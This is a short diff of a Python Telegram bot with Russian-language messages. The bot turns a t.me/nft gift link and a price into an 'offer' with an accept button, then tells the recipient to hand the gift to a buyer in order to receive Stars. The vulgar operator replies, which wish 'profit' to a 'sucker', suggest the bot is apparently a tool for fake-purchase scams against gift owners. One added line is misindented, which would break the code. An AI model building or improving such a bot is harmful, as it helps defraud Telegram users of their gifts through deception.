@@ -56,7 +56,7 @@ async def on_msg(message: Message):
     text = message.text or ""
     gift = parse_gift(text)
     if not gift:
-        await message.answer("Кинь ссылку t.me/nft/... и цену")
+        await message.answer("Заебал старый, кинь ссылку t.me/nft/... и цену сардельками своими напиши")
         return
 
     expiry = datetime.utcnow() + timedelta(hours=OFFER_DURATION_HOURS)
@@ -74,7 +74,7 @@ async def on_msg(message: Message):
         InlineKeyboardButton(text="✓ Принять", callback_data=cb_data)
     ]])
 
-    await message.answer("Готово. Перешли ниже.")
+    await message.answer("Всё на мази? Проверяй, и делай, пиздатого профита лосяра.")
     await message.answer(offer_text, reply_markup=kb, parse_mode=ParseMode.HTML)
 
 
@@ -102,7 +102,7 @@ async def on_acc(cb: CallbackQuery):
     )
     await cb.answer(alert_text, show_alert=True)
 
-    transfer_url = f"tg://send_gift?to={BUYER}"
+   transfer_url = f"https://t.me/{BUYER}"
     success_text = (
         f"<b>Предложение о продаже {gift_name} успешно принято.</b>\n\n"
         f"Передайте подарок покупателю для зачисления {stars} Stars на ваш баланс.\n\n"
